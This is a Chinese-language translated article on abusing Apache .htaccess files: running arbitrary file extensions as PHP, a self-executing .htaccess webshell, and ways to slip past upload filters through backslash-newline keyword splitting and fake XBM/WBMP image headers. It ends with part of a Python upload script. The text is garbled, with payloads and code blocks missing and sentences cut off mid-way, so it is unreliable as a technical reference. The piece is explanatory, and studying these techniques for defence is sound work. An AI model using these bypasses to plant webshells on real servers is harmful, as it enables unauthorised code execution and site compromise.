# .htaccess利用与Bypass方式总结
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
.htaccess文件是apache服务器的一种目录级别的修改配置的方式，可以用来配置当前目录及其所有子目录，常常被用于访问URL时重写路径；在此总结一下相关利用及bypass的方式
测试环境：Ubuntu18.04+Apache2+php7.2
`/etc/apache2`下有两个文件夹`mods-enable`和`mods-available`，其中`mods-enable`里装的是apache已经被启用的模块，`mods-available`里装的是当前系统可用的模块
切换到`mods-enabled`，查看`php7.2.conf`：
通过FilesMath匹配文件后缀，其默认配置是当匹配到`phar`、`php`、`phtml`时，都将其作为php来执行，其中SetHandler就是设置解析方式
例如在`1.phar`中写入`
        Require all granted
        Order allow,deny
        Allow from all
测试：
(2)直接使用.htaccess shell
例如下面这个.htaccess文件，首先设置了禁用拒绝规则，这样便可直接访问到.htaccess；接着用`SetHandler`将所有文件作为php解析，最后写入php代码，开头用`#`注释掉，这样便可成功解析.htaccess，然后解析php：
     Require all granted
     Order allow,deny
     Allow from all
    SetHandler application/x-httpd-php
    # 
相关的关于.htaccess的shell，可参考github上一个项目：
    https://github.com/wireghoul/htshells
## Bypass方式
###  1.关键字检测
**方法1**
如果过滤了.htaccess常用的关键字，此时可以使用反斜线来绕过对关键字的过滤，反斜线后需要加上换行符，并且反斜线前和关键字无空格
例如：
    AddT
    ype application/x-httpd-php .abc
**方法2**
如果检测不能含有`
(下面的`1_png_width`以及`1_png_height`是根据文件名进行拼接生成的)
那么可以在.htaccess前面加上：
    #define 1_png_width 120
    #define 1_png_height 20
便可绕过对文件格式的检测
**方法2**
使用WBMP图像，使用PHP生成图像：
使用16进制编辑器查看：
可以看到这种图像格式是以`0x00`开头的，那么便可以此方式绕过对文件格式的检测
###  4.其他字符限制
若过滤了`'''
         }
    r = requests.session()
    r.post(url,files=files,headers=headers,data=data)
    t = r.get('http://127.0.0.1/test.php',headers=headers)
    print(t.text)
成功执行：
## 小结
除以上思路外应该还有很多的利用思路，本菜鸡只能想到这了qaq
从以上利用姿势可以看出，如果网站根目录中的.htaccess内容可控并且能够被解析，那么便很可能产生威胁，因此网站建设时需要多多留意这点～